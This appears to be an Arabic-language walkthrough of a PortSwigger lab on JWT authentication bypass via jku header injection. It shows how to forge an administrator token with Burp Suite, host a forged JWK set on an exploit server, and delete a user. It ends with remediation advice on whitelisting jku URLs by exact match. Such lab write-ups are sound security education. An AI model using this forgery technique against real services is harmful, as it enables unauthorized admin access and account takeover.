# [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

## **`الهدف`**
قم بتزوير `JWT` يعطيك صلاحيات للوصول إلى لوحة التحكم في `/admin` ثم حذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` بعد ذلك نذهب إلى مسار `/admin` ولكن سنقوم باعتراض هذا الـ `request` ونقله إلى `repeater`
```http
GET /admin HTTP/2
Host: 0a79004d04cf9852806326ea00e000af.web-security-academy.net
Cookie: session=eyJraWQiOiI2Y2I5MDc5YS0yNDhjLTRhZDEtYjYzNi1jOGY5YjI0ZmFkN2MiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NTY1MDM5MSwic3ViIjoid2llbmVyIn0.o3ihz0ooWPTTt3zhe7CPCRwu79ydpqfzGohJtKVWB8lV725e5P4R4sUfq7HAM52_H6Lz_R21TGs4JlbFMCyadda415OVnyH25ftpQoRhQDa742bfBUgvPsMy2kqqevfnSCi9IMPo8adHyll2Wz__n3JGXyIm2agHD-P_hJs0gomqfv4gNs-iR_kW95deGEDmqE6WByyWygbEpV-o92fNdTxytwFQGnDSJwL6IDWLW_cv0n-P4L0cSuN_oqeSWKutFouKXT4Tbu0ktpTc6q6natDjtuFEStUXOgR1DrDmg-5KKH9DoyqWn1iZZ7oxrCvJRJ23OW9F1kCbHNYipioG9A
```

وبعد ذلك سنذهب إلى `Burp Suite` ونذهب إلى إضافة `JWT Editior` ونقوم بإضافة `New RSA Key` ونضغط `Generate`

ثم نعود إلى الـ `request` الموجود في `repeater`، ونستعمل `Inspector` ونقوم بتظليل الجزء الخاص بالـ `Payload` في الـ `Session token` ونقوم بتعديل اسم `wiener` إلى `administrator`، ثم نقوم بتعديل الـ `Header` ونضيف `jku` يشير إلى رابط السيرفر الموجود في اللاب، ونقوم بتعديل ال `kid` إلى الخاص بالمفتاح الذي قُمنها بإنشائه.
```Json
{"kid":"07328546-9450-42e0-a451-687033739228","alg":"RS256","jku":"https://exploit-0ae300ab0432986e801225b101930040.exploit-server.net/exploit"}
```

ثم نضغط على إختيار `JSON Web Token` ونقوم بالضغط على `Sign` مع التأكيد على إختيار `Don't modify header`.

ثم نقوم بالذهاب إلى السيرفر الموجود في اللاب ونقوم بحقن بعض معلومات المفتاح الذي قمنا بإنشاءه داخل `Body` ثم نضغط `Store`
```JSON
{
"keys": [
{
"kty": "RSA",
"kid": "07328546-9450-42e0-a451-687033739228",
"n": "6brSOb8kVB6j-QVVIzeJ0fkQh537LqBc4UsCyBnbWEYcUA0E2UvNTznfX4Goe4fJXeaBZ4zQHUihjM8-wEtu7ssKSn0HQZaYEDCqtAKREHqWhHwYC8TK51IUtpBjL-Pt6JlHcXfziUYSuJSnbsNC0jynScmwk-jd-J5ncIfmTE-K0xjVK5I80R-YRSpJ-F8fH0M0jjurBp_moC4bFm3FzweBN7bMAuJZZuzLshBhP7iz8k5nkmDOkQrOpejueNm1kZuwgxoNZ1tMAT_8mZkXY4KvxSJwja_K2CkKXOkWFInKh_K2GJuvaJ2dB8oMK46bfUSoffKao_RZnenXfAfGcQ",
"e": "AQAB"
}
]
}
```

ونعود إلى `repeater` ونقوم بإرسال الـ `request` لنتأكد من صحة الـ `response.

ثم سنقوم بنسخ كامل الـ `Session token` بعد التعديل، ونقوم بالذهاب إلى المتصفح داخل اللاب والضغط على `F12` ووضعها بدلًا من القديمة وعمل `refresh` للصفحة، ونستطيع بعد ذلك الدخول مرة أخرى إلى `/admin` وحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة
يجب على المبرمجين قراءة توثيق `Document` المكتبة المستخدمة وإيقاف تفعيل دعم `jku` إذا لم تكن هناك حاجة ماسة له، وبدلًا من ذلك يجب الاعتماد على مفاتيح مخزنة محليًا أو يتم جلبها من رابط داخلي ثابت ومعروف مسبقاً لا يمكن للمستخدم التحكم فيه.

وإذا كان لا بد من استعمال `jku` فيجب استعمال قائمة بيضاء تحتوي على النطاقات الموثوقة فقط، ويجب أن يتحقق الكود من أن الرابط الموجود في `jku` يتطابق تماماً `Exact Match` مع أحد النطاقات المسموح بها، ولا يجب أبداً استخدام دوال مثل `startsWith` أو `contains` للتحقق، لأن المهاجم يمكنه تجاوزها بسهولة.
